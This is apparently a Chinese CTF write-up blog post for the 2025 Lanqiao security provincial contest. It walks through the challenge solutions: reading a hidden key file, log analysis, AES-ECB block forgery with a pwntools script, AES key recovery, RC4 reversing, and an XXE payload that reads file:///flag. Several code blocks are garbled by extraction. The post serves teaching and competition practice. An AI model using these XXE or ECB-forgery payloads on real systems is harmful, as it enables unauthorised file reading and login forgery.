---
title: "2025蓝桥安全省赛"
description: 
slug: 
date: 
image: 
categories:
    - ctf
tags:
    - 
weight: 1
---

### 1.情报收集

#### 密室逃脱

你被困在了顶级⿊客精⼼设计的数字牢笼中，每⼀道关卡都暗藏致命陷阱！唯⼀的逃脱之路，是破解散落在服务器各处的加密线索，找到最终的“数字钥匙”。

提示：

![](https://img.xiaoyuwell.top/PicGo/20260527152610721.png)

点击查看日志

![](https://img.xiaoyuwell.top/PicGo/20260527152713418.png)

加密字符-->密文

![](https://img.xiaoyuwell.top/PicGo/20260527152814430.png)

提示我们猜测文件名并访问

访问app.py

![](https://img.xiaoyuwell.top/PicGo/20260527152947909.png)

```python
import os
from flask import Flask, request, render_template from config import *
# author: gamelab


app = Flask(  name  )


# 模拟敏感信息
sensitive_info = SENSITIVE_INFO


# 加密密钥
encryption_key = ENCRYPTION_KEY


def simple_encrypt(text, key): encrypted = bytearray() for i in range(len(text)):
char = text[i]
key_char = key[i % len(key)] encrypted.append(ord(char) + ord(key_char))
return encrypted.hex()


encrypted_sensitive_info = simple_encrypt(sensitive_info, encryption_key)
# 模拟日志文件内容
log_content = f"用户访问了 /secret 页面，可能试图获取 {encrypted_sensitive_info}"

# 模拟隐藏文件内容
hidden_file_content = f"解密密钥: {encryption_key}"

# 指定安全的文件根目录
SAFE_ROOT_DIR = os.path.abspath('/app')
with open(os.path.join(SAFE_ROOT_DIR, 'hidden.txt'), 'w') as f: f.write(hidden_file_content)

@app.route('/') def index():
return render_template('index.html')


@app.route('/logs') def logs():
return render_template('logs.html', log_content=log_content)


@app.route('/secret') def secret():
return render_template('secret.html')


@app.route('/file') def file():
file_name = request.args.get('name') if not file_name:
return render_template('no_file_name.html')
full_path = os.path.abspath(os.path.join(SAFE_ROOT_DIR, file_name)) if not full_path.startswith(SAFE_ROOT_DIR) or 'config' in full_path:
return render_template('no_premission.html') try:
with open(full_path, 'r') as f: content = f.read()
return render_template('file_content.html', content=content)
except FileNotFoundError:
return render_template('file_not_found.html')


if   name	 == ' main ': app.run(debug=True, host='0.0.0.0')
```

程序使用simple_encrypt(函数对敏感信息进行加密，当用戶访问/logs页面时返回加密后的敏感信息。
当用戶访问/hidden.txt页面时返回密钥key，我们手动访问一下：

![](https://img.xiaoyuwell.top/PicGo/20260527153121127.png)

拿到加密算法、密钥和密文---->明文

```python
def simple_decrypt(encrypted_hex, key): encrypted_bytes = bytearray.fromhex(encrypted_hex)

decrypted = bytearray()
for i in range(len(encrypted_bytes)): encrypted_char = encrypted_bytes[i] key_char = key[i % len(key)]
decrypted.append(encrypted_char - ord(key_char))


return decrypted.decode('utf-8')


print(simple_decrypt("d9d1c4d9e0abc2a497df9a9a6c5fa4c9c9a592a8c39ccba6709b6b98a0c7c6d89cd994  a39aae6f6f68af", "secret_key8672"))

# flag{7c92fbd5-1df3-4d1f-8e4f-bcf7e5855791}
```

### 2.数据分析

#### ezEvtx

EVTX文件是Windows操作系统生成的事件日志文件，用于记录系统、应用程序和安全事件。
（本题需要选手找出攻击者访问成功的一个敏感文件，提交格式为flag{文件名}，其中文件名不包含文件路径，
且包含文件后缀）
用Windows自带的事件查看器打开，点击右侧搜索按钮，搜索文件关键字：|

![](https://img.xiaoyuwell.top/PicGo/20260527153512442.png)

点击级别进行排序就可以看到异常文件

#### flowzip

直接字符串搜索flag

![](https://img.xiaoyuwell.top/PicGo/20260529130711232.png)

### 3.密码破解

#### Enigma

打开是Cyberchef使用Enigma加密结果

![](https://img.xiaoyuwell.top/PicGo/20260529130857889.png)

直接出现明文，怀疑对称加密

![](https://img.xiaoyuwell.top/PicGo/20260529131307048.png)

#### ECBTrain

AES的ECB模式存在很明显的缺陷。你能否尝试以admin身份完成本题挑战？
靶机题目，加密算法为AES的ECB模式。利用了
AES-ECB加密模式的分块独立加密特性。
ECB模式下，相同的明文块始终加密为相同的密文块，且各块加密互不影响。
思路：
1.首先发送特定填充数据获取正常密文结构
2.然后构造包含admin的输入，使其单独成为一个加密块
3.最后将目标密文块替换到原始密文中，伪造有效凭证
完整exp:

```python
from pwn import *


p = remote("0.0.0.0", 12345)


# 第一次加密：获取填充后的密文结构
p.sendlineafter(b":", b"1")
#  发送两个完整块(16字节)加一个字节，使第三个块只包含一个字节
p.sendlineafter(b":", b"\x0f"*16 + b"\x0f"*16 + b"\x0f") p.sendlineafter(b":", b"123456")

enc1 = p.recvline().decode().strip().split(":")[-1] print("enc1:", enc1)
# 第二次加密：构造包含"admin"的数据
p.sendlineafter(b":", b"1")
# 发送三个完整块加"admin"，使"admin"单独成为一个块
p.sendlineafter(b":", b"\x0f"*16 + b"\x0f"*16 + b"\x0f"*16 + b"admin") p.sendlineafter(b":", b"123456")

enc2 = p.recvline().decode().strip().split(":")[-1] print("enc2:", enc2)

# 提取"admin"对应的密文块
# 假设"admin"块是第四个块(索引3)，因为前三个块是填充
admin_block = enc2[96:128] # 每个块32个十六进制字符(16字节)

# 构造认证数据：用admin块替换原始密文中的某个块
auth_data = enc1[:32] + admin_block


# admin认证登录 p.sendlineafter(b":", b"2")
p.sendlineafter(b":", auth_data.encode())


p.interactive()
```

#### easy_AES

题目采用的是传统的AES加密，但是其中的key似乎可以通过爆破得到，你能找到其中的问题吗？

task.py

```python
from Crypto.Cipher import AES  # 导入AES加密模块
from secret import flag       # 从secret模块导入flag（假设为明文）
import random, os             # 导入random和os模块用于随机数生成

# 为消息填充字节，使其长度为16的倍数
def pad(msg):
    return msg + bytes([16 - len(msg) % 16 for _ in range(16 - len(msg) % 16)])

# 对密钥进行随机置换，生成新密钥
def permutation(key):
    tables = [hex(_)[2:] for _ in range(16)]  # 生成0-15的十六进制表（去掉"0x"前缀）
    random.shuffle(tables)                    # 随机打乱表
    newkey = "".join(tables[int(key[_], 16)] for _ in range(len(key)))  # 根据原密钥生成新密钥
    return newkey

# 生成初始密钥key0及其置换密钥key1
def gen():
    key0 = os.urandom(16).hex()  # 随机生成16字节密钥并转为十六进制字符串
    key1 = permutation(key0)     # 对key0进行置换生成key1
    return key0, key1

# 使用key0和key1进行双重AES加密
def encrypt(key0, key1, msg):
    aes0 = AES.new(key0, AES.MODE_CBC, key1)  # 用key0加密，key1作为CBC模式的IV
    aes1 = AES.new(key1, AES.MODE_CBC, key0)  # 用key1解密，key0作为CBC模式的IV
    return aes1.decrypt(aes0.encrypt(msg))    # 先加密后解密生成密文

# 生成密钥对
key0, key1 = gen()
a0, a1 = int(key0, 16), int(key1, 16)  # 将密钥转为整数

gift = a0 & a1  # 计算key0和key1的按位与，作为泄露信息
cipher = encrypt(bytes.fromhex(key0), bytes.fromhex(key1), pad(flag))  # 加密填充后的flag

print(f"gift = {gift}")
print(f"key1 = {key1}")
print(f"cipher = {cipher}")

'''
gift = 64698960125130294692475067384121553664
key1 = 74aeb356c6eb74f364cd316497c0f714
cipher = b'6\xbf\x9b\xb1\x93\x14\x82\x9a\xa4\xc2\xaf\xd0L\xad\xbb5\x0e|>\x8c|\xf0^dl~X\xc7R\xcaZ\xab\x16\xbe r\xf6Pl\xe0\x93\xfc)\x0e\x93\x8e\xd3\xd6'
'''
```

exp:

```python
from Crypto.Cipher import AES

# ===================== given =====================
gift   = 64698960125130294692475067384121553664
key1   = "74aeb356c6eb74f364cd316497c0f714"
cipher = b"6\xbf\x9b\xb1\x93\x14\x82\x9a\xa4\xc2\xaf\xd0L\xad\xbb5\x0e|>\x8c|\xf0^dl~X\xc7R\xcaZ\xab\x16\xbe r\xf6Pl\xe0\x93\xfc)\x0e\x93\x8e\xd3\xd6"

# ===================== step 1: recover key0 =====================

# Group every position by the hex digit that key1 has there
pos_by_digit: dict[str, list[int]] = {}
for i, ch in enumerate(key1):
    pos_by_digit.setdefault(ch, []).append(i)

# For each distinct digit v of key1, the corresponding key0 digit u
# must satisfy  u & int(v,16) == gift_nibble  at every position.
candidates: dict[str, list[int]] = {}
for v, positions in pos_by_digit.items():
    v_val = int(v, 16)
    g_val = (gift >> (4 * (31 - positions[0]))) & 0xF
    candidates[v] = [u for u in range(16) if (u & v_val) == g_val]

# Enumerate all injective mappings  v -> u  (i.e.  key1_digit -> key0_digit)
all_digits = list(pos_by_digit.keys())
solutions: list[dict[int, str]] = []   # each element is {u_value: v_char}
assigned:   dict[int, str] = {}

def backtrack(idx: int) -> None:
    if idx == len(all_digits):
        solutions.append(dict(assigned))
        return
    v = all_digits[idx]
    for u in candidates[v]:
        if u in assigned:
            continue
        assigned[u] = v
        backtrack(idx + 1)
        del assigned[u]

backtrack(0)
print(f"[*] Generated {len(solutions)} candidate keys, trying each …")

# ===================== step 2: decrypt with each key0 =====================

k1b = bytes.fromhex(key1)

for sol in solutions:
    v_to_u = {v: u for u, v in sol.items()}            # flip: {u:v} → {v:u}
    key0 = "".join(hex(v_to_u[ch])[2:] for ch in key1) # reconstruct hex string
    k0b = bytes.fromhex(key0)

    # encrypt()  = aes1.decrypt(aes0.encrypt(msg))
    # decrypt()  = aes0.decrypt(aes1.encrypt(cipher))
    aes1 = AES.new(k1b, AES.MODE_CBC, k0b)
    aes0 = AES.new(k0b, AES.MODE_CBC, k1b)
    plain = aes0.decrypt(aes1.encrypt(cipher))

    if plain.startswith(b"flag{") or plain.startswith(b"CTF{"):
        pad_len = plain[-1]
        if 1 <= pad_len <= 16:
            flag = plain[:-pad_len]
            print(f"\n[+] key0 = {key0}")
            print(f"[+] Flag = {flag.decode()}")
            break
else:
    print("[-] No valid flag found among candidates.")

```

### 4.逆向分析

#### shadowphases

拖⼊IDA分析，发现会将我们的input与enc进⾏⽐较：

![](https://img.xiaoyuwell.top/PicGo/20260529135402382.png)

直接动态调试，拿出enc的数据即可：

![](https://img.xiaoyuwell.top/PicGo/20260529135442373.png)

#### BashBreaker

找到main函数后发现有一个key解密函数：

![](https://img.xiaoyuwell.top/PicGo/20260529135550302.png)

将其if判断语句patch为nop后打印出key：

![](https://img.xiaoyuwell.top/PicGo/20260529135626910.png)

函数表中有魔改的rc4函数：

![](https://img.xiaoyuwell.top/PicGo/20260529135716190.png)

数据区域是密文

![](https://img.xiaoyuwell.top/PicGo/20260529135813534.png)

```python
from Crypto.Cipher import ARC4
import binascii

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + (key[i % len(key)] ^ 0x37)) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        k = ((16 * k) | (k >> 4)) & 0xff
        result.append((byte ^ k) & 0xff)

    return bytes(result)

if __name__ == "__main__":
    key = b"EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3848BD70129D0141A5B8F089F280F4BE6CCD"

    enc = [0xBB, 0xCA, 0x12, 0x14, 0xD0, 0xF1, 0x99, 0xA7, 0x91, 0x48,0xC3, 0x28, 0x73, 0xAD, 0xB7, 0x75, 0x8C, 0x89, 0xCD, 0xDD,
0x2D, 0x50, 0x5D, 0x7F, 0x95, 0xB1, 0xA4, 0x9D, 0x09, 0x43,0xE1, 0xD2, 0xE9, 0x66, 0xEA, 0x18, 0x98, 0xC6, 0xCC, 0x02,0x39, 0x18]
    plaintext = bytes(enc)

    ciphertext = rc4(key, plaintext)
    print("加密结果 (Hex):", bytes(ciphertext))
```

#### 星际XML解析器

[打开发现是一个XML解析器，编写payload：

```
<IDOCTYPE name
<!ENTITY xxe SYSTEM"file:///flag">
]>
caaa>
<name>&xxe;</name>
/aaa>
```

当服务器解析这段XML时：
1.遇到&xxe；引用时，尝试加载定义的外部实体
2.通过file：//协议，解析器会读取服务器上的/flag文件
3.flag文件内容会被包含在XML响应中返回

![](https://img.xiaoyuwell.top/PicGo/20260529140329869.png)
